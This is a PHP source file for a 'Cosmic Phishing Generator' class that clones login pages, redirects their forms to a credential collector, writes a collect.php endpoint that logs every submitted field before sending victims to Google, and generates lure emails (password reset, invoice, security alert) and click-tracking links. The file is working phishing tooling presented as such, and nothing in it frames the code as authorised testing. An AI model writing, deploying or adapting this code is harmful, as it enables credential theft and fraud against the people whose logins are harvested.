<?php

/**
 * COSMIC PHISHING GENERATOR – INDUSTRIAL‑GRADE PHISHING CAMPAIGNS
 * Generates clone pages, email templates, and tracking links.
 */
class PhishingGenerator {
    private $campaigns = [];
    private $db;
    
    public function __construct($useDB = false) {
        if ($useDB) {
            $this->initDB();
        }
    }
    
    private function initDB() {
        $dbPath = dirname(__DIR__, 2) . '/data/phishing/campaigns.db';
        $dir = dirname($dbPath);
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        $this->db = new SQLite3($dbPath);
        $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT,
            target_url TEXT,
            clone_path TEXT,
            email_template TEXT,
            created_at INTEGER,
            clicks INTEGER DEFAULT 0,
            credentials TEXT
        )");
    }
    
    /**
     * Clone a webpage for phishing.
     */
    public function clonePage($url, $campaignName) {
        $html = @file_get_contents($url);
        if (!$html) return false;
        
        // Modify forms to point to our collector
        $html = preg_replace('/<form(.*?)action="(.*?)"(.*?)>/i', '<form$1action="/phishing/collect"$3>', $html);
        $html = preg_replace('/<input(.*?)name="password"(.*?)>/i', '<input$1name="password"$2>', $html);
        
        $savePath = dirname(__DIR__, 2) . "/public/phishing/pages/$campaignName/index.html";
        $dir = dirname($savePath);
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        file_put_contents($savePath, $html);
        
        // Create collector endpoint
        $collectorPath = dirname(__DIR__, 2) . "/public/phishing/collect.php";
        if (!file_exists($collectorPath)) {
            $collector = <<<'EOF'
<?php
$data = $_POST;
$campaign = $_GET['campaign'] ?? 'unknown';
$log = date('Y-m-d H:i:s') . " | " . json_encode($data) . "\n";
file_put_contents(__DIR__ . "/logs/$campaign.txt", $log, FILE_APPEND);
header('Location: https://www.google.com');
EOF;
            file_put_contents($collectorPath, $collector);
        }
        
        return "/phishing/pages/$campaignName/";
    }
    
    /**
     * Generate a phishing email template.
     */
    public function generateEmailTemplate($type, $targetName, $phishingLink) {
        $templates = [
            'password_reset' => "Dear $targetName,\n\nYour password has expired. Please reset it immediately: $phishingLink\n\nIT Support",
            'invoice' => "Dear $targetName,\n\nPlease find attached invoice. Click to view: $phishingLink\n\nFinance Dept",
            'security_alert' => "ALERT: Unusual login detected. Verify your account: $phishingLink\n\nSecurity Team"
        ];
        return $templates[$type] ?? $templates['security_alert'];
    }
    
    /**
     * Create a tracking link (shortened URL).
     */
    public function createTrackingLink($targetUrl, $campaignId) {
        $code = bin2hex(random_bytes(4));
        $shortUrl = "/l/$code";
        
        // Save mapping
        $mapFile = dirname(__DIR__, 2) . '/data/phishing/links.json';
        $links = [];
        if (file_exists($mapFile)) {
            $links = json_decode(file_get_contents($mapFile), true);
        }
        $links[$code] = ['url' => $targetUrl, 'campaign' => $campaignId, 'clicks' => 0];
        file_put_contents($mapFile, json_encode($links));
        
        return $shortUrl;
    }
    
    /**
     * Log a click (increment counter).
     */
    public function logClick($code) {
        $mapFile = dirname(__DIR__, 2) . '/data/phishing/links.json';
        if (file_exists($mapFile)) {
            $links = json_decode(file_get_contents($mapFile), true);
            if (isset($links[$code])) {
                $links[$code]['clicks']++;
                file_put_contents($mapFile, json_encode($links));
                // Also log to DB if available
                if ($this->db) {
                    $stmt = $this->db->prepare("UPDATE campaigns SET clicks = clicks + 1 WHERE id = ?");
                    $stmt->bindValue(1, $links[$code]['campaign'], SQLITE3_INTEGER);
                    $stmt->execute();
                }
            }
        }
    }
    
    /**
     * Get campaign stats.
     */
    public function getCampaignStats($campaignId) {
        if (!$this->db) return [];
        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = ?");
        $stmt->bindValue(1, $campaignId, SQLITE3_INTEGER);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }
}
